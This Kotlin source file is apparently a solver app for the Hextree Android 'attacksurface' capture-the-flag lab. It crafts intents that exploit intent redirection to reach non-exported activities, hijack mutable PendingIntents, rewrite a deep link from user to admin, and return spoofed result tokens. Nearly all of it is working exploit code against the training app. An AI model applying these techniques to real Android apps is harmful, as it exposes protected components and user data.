package com.example.hetreepoc

import android.app.PendingIntent
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.util.Log
import android.widget.Button
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.ActivityResult
import androidx.activity.result.contract.ActivityResultContract
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import java.util.concurrent.Executor
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class IntentSolver : AppCompatActivity() {
    val RC_FLAG_22 = 22
    val RC_FLAG_23 = 23

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_intent_solver)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        val flag1Button: Button = findViewById(R.id.flag1Button)
        flag1Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag1Activity"
            )
            startActivity(intent)
        }

        val flag2Button: Button = findViewById(R.id.flag2Button)
        flag2Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag2Activity"
            )
            intent.action = "io.hextree.action.GIVE_FLAG"
            startActivity(intent)
        }

        val flag3Button: Button = findViewById(R.id.flag3Button)
        flag3Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag3Activity"
            )
            intent.action = "io.hextree.action.GIVE_FLAG"
            intent.data = Uri.parse("https://app.hextree.io/map/android")
            startActivity(intent)
        }


        val flag5Button: Button = findViewById(R.id.flag5Button)
        flag5Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
            val nextIntent = Intent()
            nextIntent.putExtra("reason", "back")

            val intent2 = Intent()
            intent2.putExtra("return", 42)
            intent2.putExtra("nextIntent", nextIntent)

            intent.putExtra(
                Intent.EXTRA_INTENT,
                intent2
            )
            startActivity(intent)
        }
        //Flag5Activity has Intent redirection vulnerability!!!
        //We can reach non-exported Intents!!!
        val flag6Button: Button = findViewById(R.id.flag6Button)
        flag6Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
            val nextIntent = Intent()
            nextIntent.putExtra("reason", "next")
            nextIntent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag6Activity"
            )
            nextIntent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION

            val intent2 = Intent()
            intent2.putExtra("return", 42)
            intent2.putExtra("nextIntent", nextIntent)

            intent.putExtra(
                Intent.EXTRA_INTENT,
                intent2
            )
            startActivity(intent)
        }

        val flag7Button: Button = findViewById(R.id.flag7Button)
        flag7Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag7Activity"
            )
            intent.action = "OPEN"
            startActivity(intent)
            Log.i(IntentSolver::class.java.name,  "OPEN sent")
            Executors.newSingleThreadScheduledExecutor().schedule({
                val reopenIntent = Intent()
                reopenIntent.component = ComponentName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.activities.Flag7Activity"
                )
                reopenIntent.action = "REOPEN"
                reopenIntent.flags = reopenIntent.flags or Intent.FLAG_ACTIVITY_SINGLE_TOP
                startActivity(reopenIntent)
                Log.i(IntentSolver::class.java.name,  "REOPEN sent")
            }, 2, TimeUnit.SECONDS)
        }

        val flag8Button: Button = findViewById(R.id.flag8Button)
        flag8Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "com.example.hetreepoc",
                "com.example.hetreepoc.Flag8ActivityHextree"
            )
            startActivity(intent)
        }

        val flag9Button: Button = findViewById(R.id.flag9Button)
        flag9Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "com.example.hetreepoc",
                "com.example.hetreepoc.Flag9ActivityHextree"
            )
            startActivity(intent)
        }
        val flag12Button: Button = findViewById(R.id.flag12Button)
        flag12Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag12Activity"
            )
            intent.action = null
            intent.putExtra("LOGIN", true)
            startActivity(intent)
        }
        val flag22Button: Button = findViewById(R.id.flag22Button)
        flag22Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag22Activity"
            )

            val intentToSend = Intent()
            intentToSend.component = ComponentName(
                "com.example.hetreepoc",
                "com.example.hetreepoc.IntentSolver"
            )
            intentToSend.action = "Flag22"

            val pendingIntent = PendingIntent.getActivity(this, RC_FLAG_22, intentToSend, PendingIntent.FLAG_MUTABLE)
            intent.putExtra("PENDING", pendingIntent)
            startActivity(intent)

            //I send `intent`
            //App receives it and extracts the `pendingIntent`
            //App then invokes my pending intent which launches an activity as described by `intentToSend`
            //App also passes additional data to the `intentToSend` as you see in the decompilation
            //My app handles the received intent and reads the flag
        }

        val shouldFinish = handleReceivedIntent()
        if(shouldFinish)
            finish()
    }

    private fun handleReceivedIntent(): Boolean {
        if(intent == null)
            return false

        if(intent.action == "io.hextree.attacksurface.ATTACK_ME") {
            if(callingActivity == null) {
                Log.i(IntentSolver::class.java.name, "flag: ${intent.getStringExtra("flag")}") //Flag10
                Utils.showDialog(this, intent)
                return false
            } else {
                if("Flag11Activity" in callingActivity!!.className) {
                    val resultIntent = Intent()
                    resultIntent.putExtra("token", 0x41414141)
                    setResult(RESULT_OK, resultIntent)
                    return true
                }
                if("Flag12Activity" in callingActivity!!.className) {
                    val resultIntent = Intent()
                    resultIntent.putExtra("token", 0x41414141)
                    setResult(RESULT_OK, resultIntent)
                    return true
                }
            }
        } else if(intent.action == "Flag22") {
            Log.i(IntentSolver::class.java.name, "flag: ${intent.getStringExtra("flag")}") //Flag22
            Utils.showDialog(this, intent)
            return false
        } else if(intent.action == "io.hextree.attacksurface.MUTATE_ME") {
            val pendingIntent = intent.getParcelableExtra<PendingIntent>("pending_intent")!!
            val mutableIntent = Intent()
            //The contents of `mutableIntent` will be copied to the `pendingIntent` only
            //where fields are not defined by out `mutableIntent`
            //e.g. `mutableIntent.action = "lalala"` would be ignored
            mutableIntent.putExtra("code", 42)
            pendingIntent.send(this, RC_FLAG_23, mutableIntent)
            return true
        } else if(intent.action == "android.intent.action.VIEW") {
            val uri = intent.data
            if(uri != null && uri.scheme == "hex" && uri.host == "token") {
                val newIntent = Intent()
                newIntent.fillIn(intent,
                    Intent.FILL_IN_DATA or Intent.FILL_IN_ACTION or Intent.FILL_IN_CATEGORIES
                )
                newIntent.component = ComponentName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.activities.Flag14Activity"
                )
                newIntent.data = Uri.parse(newIntent.dataString!!.replace("type=user", "type=admin"))
                startActivity(newIntent)
            }
        }
        return false
    }
}
